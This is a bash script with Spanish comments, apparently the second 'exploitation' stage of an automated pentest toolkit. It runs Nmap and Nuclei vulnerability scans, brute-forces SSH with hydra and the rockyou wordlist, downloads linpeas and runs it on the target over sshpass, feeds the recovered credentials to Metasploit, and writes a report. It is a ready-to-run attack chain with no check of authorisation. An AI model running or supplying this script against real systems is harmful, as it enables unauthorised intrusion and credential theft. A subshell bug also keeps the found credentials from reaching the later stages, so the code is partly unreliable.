#!/bin/bash
# Autor: ssmax
# Versión: 3.2 corregida
# ----------------------------
# SCRIPT DE PENTEST AUTOMATIZADO - Etapa 2: Explotación
# Reutiliza resultados de etapa 1, realiza fuerza bruta SSH,
# escanea vulnerabilidades con Nmap y Nuclei, ejecuta linpeas,
# integra Metasploit y genera reporte final.
# ----------------------------

OUTPUT_DIR="./pentest_results"
mkdir -p "$OUTPUT_DIR"

USERLIST="/usr/share/wordlists/usernames.txt"
PASSLIST="/usr/share/wordlists/rockyou.txt"

# Importar resultados de etapa 1
if [ -f "target.txt" ]; then
    TARGET=$(cat target.txt)
else
    read -p "Introduce la IP objetivo: " TARGET
    echo "$TARGET" > target.txt
fi

if [ -f "open_ports.txt" ]; then
    mapfile -t PORTS < open_ports.txt
else
    read -p "Introduce los puertos abiertos separados por espacio: " -a PORTS
    printf "%s\n" "${PORTS[@]}" > open_ports.txt
fi

declare -a CRED_USER
declare -a CRED_PASS

log() { echo -e "[INFO] $(date '+%Y-%m-%d %H:%M:%S') $1"; }
warn() { echo -e "[WARN] $(date '+%Y-%m-%d %H:%M:%S') $1"; }
succ() { echo -e "[OK]  $(date '+%Y-%m-%d %H:%M:%S') $1"; }

check_requirements() {
    for tool in hydra nmap curl sshpass msfconsole; do
        command -v "$tool" >/dev/null || { echo "Falta herramienta: $tool"; exit 1; }
    done
}

deep_vuln_scan() {
    local ports_str=$(IFS=, ; echo "${PORTS[*]}")

    if [ -f "nmap_vuln.txt" ]; then
        read -p "¿Deseas volver a ejecutar el escaneo de Nmap? (s/n): " rescan
        if [ "$rescan" != "s" ]; then
            succ "Reutilizando nmap_vuln.txt existente."
            return
        fi
    fi

    log "Ejecutando escaneo Nmap en puertos: $ports_str..."
    nmap -sV -p "$ports_str" --script vuln,banner "$TARGET" -oN "$OUTPUT_DIR/nmap_vuln.txt" | tee "$OUTPUT_DIR/nmap_vuln_console.txt"
    cp "$OUTPUT_DIR/nmap_vuln.txt" nmap_vuln.txt
    succ "Escaneo Nmap completado."
}

nuclei_scan() {
    if [ -f "nuclei_results.txt" ]; then
        read -p "¿Deseas volver a ejecutar el escaneo con Nuclei? (s/n): " rescan
        if [ "$rescan" != "s" ]; then
            succ "Reutilizando nuclei_results.txt existente."
            return
        fi
    fi

    echo "$TARGET" > "$OUTPUT_DIR/target.txt"
    log "Ejecutando escaneo con Nuclei..."
    nuclei -l "$OUTPUT_DIR/target.txt" -o "$OUTPUT_DIR/nuclei_results.txt" -silent || true
    cp "$OUTPUT_DIR/nuclei_results.txt" nuclei_results.txt
    succ "Escaneo Nuclei completado."
}

ssh_brute_force() {
    for port in "${PORTS[@]}"; do
        if [[ "$port" == "2522" || "$port" == "22" ]]; then
            log "Iniciando fuerza bruta SSH en $TARGET:$port..."
            hydra -L "$USERLIST" -P "$PASSLIST" -s "$port" -f -o "$OUTPUT_DIR/hydra_ssh_$port.txt" ssh://"$TARGET" | tee -a "$OUTPUT_DIR/hydra_output.txt"

            grep -E "login:|password:" "$OUTPUT_DIR/hydra_ssh_$port.txt" | while read -r line; do
                user=$(echo "$line" | awk -F'login: ' '{print $2}' | awk '{print $1}')
                pass=$(echo "$line" | awk -F'password: ' '{print $2}' | awk '{print $1}')
                if [[ -n "$user" && -n "$pass" ]]; then
                    CRED_USER+=("$user")
                    CRED_PASS+=("$pass")
                    succ "Credenciales válidas encontradas en $TARGET:$port -> Usuario: $user, Pass: $pass"
                fi
            done
        else
            warn "Saltando fuerza bruta en puerto $port (no es SSH estándar)."
        fi
    done
}

escalate_privileges() {
    if [ ${#CRED_USER[@]} -eq 0 ]; then
        warn "No se encontraron credenciales válidas, no se puede intentar escalada."
        return
    fi

    if [ ! -f "./linpeas.sh" ]; then
        log "Descargando linpeas.sh..."
        curl -s -o linpeas.sh https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
        chmod +x linpeas.sh
    fi

    for i in "${!CRED_USER[@]}"; do
        user="${CRED_USER[$i]}"
        pass="${CRED_PASS[$i]}"
        log "Ejecutando linpeas en $TARGET con $user:$pass..."
        sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -p 2522 "$user@$TARGET" "bash -s" < ./linpeas.sh > "$OUTPUT_DIR/linpeas_${user}.txt" 2>/dev/null
        succ "Escalada completada para $user. Verifica $OUTPUT_DIR/linpeas_${user}.txt"
    done
}

run_msf_exploits() {
    if [ ${#CRED_USER[@]} -eq 0 ]; then
        warn "No hay credenciales válidas para usar en Metasploit."
        return
    fi

    MSF_RSC="$OUTPUT_DIR/msf_exploit.rc"
    echo "use auxiliary/scanner/ssh/ssh_login" > "$MSF_RSC"
    echo "set RHOSTS $TARGET" >> "$MSF_RSC"
    echo "set PORT 2522" >> "$MSF_RSC"
    echo "set THREADS 10" >> "$MSF_RSC"
    echo "set STOP_ON_SUCCESS true" >> "$MSF_RSC"
    echo "set USERPASS_FILE $OUTPUT_DIR/msf_userpass.txt" >> "$MSF_RSC"

    > "$OUTPUT_DIR/msf_userpass.txt"
    for i in "${!CRED_USER[@]}"; do
        echo "${CRED_USER[$i]}:${CRED_PASS[$i]}" >> "$OUTPUT_DIR/msf_userpass.txt"
    done

    log "Ejecutando Metasploit con credenciales válidas..."
    msfconsole -r "$MSF_RSC" -q
}

generate_report() {
    REPORT_FILE="$OUTPUT_DIR/pentest_report.txt"
    {
        echo "---- Reporte de Pentesting - $(date) ----"
        echo
        echo "Objetivo: $TARGET"
        echo
        echo "Puertos escaneados: ${PORTS[*]}"
        echo
        echo "Credenciales válidas encontradas:"
        if [ ${#CRED_USER[@]} -eq 0 ]; then
            echo "  No se encontraron credenciales válidas."
        else
            for i in "${!CRED_USER[@]}"; do
                echo "  Usuario: ${CRED_USER[$i]}, Contraseña: ${CRED_PASS[$i]}"
            done
        fi
        echo
        echo "Resultados de escaneo Nmap:"
        cat "$OUTPUT_DIR/nmap_vuln.txt" || echo "No hay resultados."
        echo
        echo "Resultados de escaneo Nuclei:"
        cat "$OUTPUT_DIR/nuclei_results.txt" || echo "No hay resultados."
        echo
        echo "Resultados de escalada de privilegios:"
        ls "$OUTPUT_DIR"/linpeas_*.txt 2>/dev/null || echo "No se realizó escalada."
        echo
        echo "Nota: Revisa los archivos en $OUTPUT_DIR para más detalles."
    } > "$REPORT_FILE"

    succ "Reporte generado en $REPORT_FILE"
}

main() {
    check_requirements
    log "Iniciando pentest contra $TARGET"
    deep_vuln_scan
    nuclei_scan
    ssh_brute_force
    escalate_privileges
    run_msf_exploits
    generate_report
    log "Pentest finalizado."
}

main
